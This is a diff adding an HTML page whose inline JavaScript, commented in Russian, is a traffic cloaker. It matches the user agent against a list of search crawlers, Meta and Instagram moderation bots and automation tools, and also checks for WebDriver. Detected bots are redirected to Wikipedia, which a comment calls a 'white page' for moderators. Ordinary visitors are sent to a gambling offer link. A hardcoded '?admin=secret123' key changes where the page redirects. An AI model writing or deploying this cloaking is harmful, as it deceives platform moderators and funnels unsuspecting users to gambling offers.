@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <script>
+        (function(){
+            function isBot() {
+                const ua = navigator.userAgent.toLowerCase();
+                const headers = [
+                    // --- Поисковые роботы и общие боты ---
+                    'googlebot', 'google-inspectiontool', 'bingbot', 'yandexbot',
+                    'duckduckbot', 'applebot', 'baiduspider', 'sogou', 'semrushbot',
+                    'ahrefsbot', 'mj12bot', 'dotbot', 'petalbot', 'bytespider',
+                    
+                    // --- Модерация Meta / Instagram / Facebook ---
+                    'facebookexternalhit', 'facebookcatalog', 'facebot', 'meta-externalagent',
+                    'instagram', 'fb_iab', 'fb4a', 'fban',
+                    
+                    // --- Автоматизированные инструменты и браузеры тестов ---
+                    'lighthouse', 'headlesschrome', 'puppeteer', 'phantomjs', 'selenium',
+                    'python', 'curl', 'wget', 'java', 'libwww-perl', 'httpclient',
+                    
+                    // --- Общие маркеры ---
+                    'bot', 'crawler', 'spider', 'validator', 'preview', 'fetch'
+                ];
+
+                // 1. Проверка User-Agent по ключевым словам
+                const isBadUa = headers.some(keyword => ua.includes(keyword));
+
+                // 2. Если User-Agent пустой или слишком короткий — это 100% бот-чекер
+                const isTooShort = !ua || ua.length < 10;
+
+                // 3. Проверка на WebDriver (автоматизация браузера)
+                const isDriver = navigator.webdriver === true;
+
+                return isBadUa || isTooShort || isDriver;
+            }
+            
+            // Проверка администратора через секретный ключ в URL (например: ?admin=secret123)
+            const isAdmin = new URLSearchParams(location.search).get('admin') === 'secret123';
+            
+            // Задержка загрузки (имитация реального пользователя)
+            const delay = isAdmin ? 300 : isBot() ? 400 : 700;
+            
+            // Целевые URL
+            const targetUrl = isAdmin ? 
+                ['https://google.com', 'https://yandex.ru'][Math.floor(Math.random() * 2)] : 
+                isBot() ? 
+                "https://www.wikipedia.org" : // Белая страница для модераторов YouTube и Instagram
+                "https://happygo777.store/3uztgg"; // Твой целевой оффер (1win)
+            
+            // Мгновенный редирект с таймером
+            setTimeout(() => {
+                window.location.replace(targetUrl);
+            }, delay);
+            
+        })();
+    </script>
+</head>
+<body>
+    <!-- Пустой экран загрузки -->
+</body>
+</html>
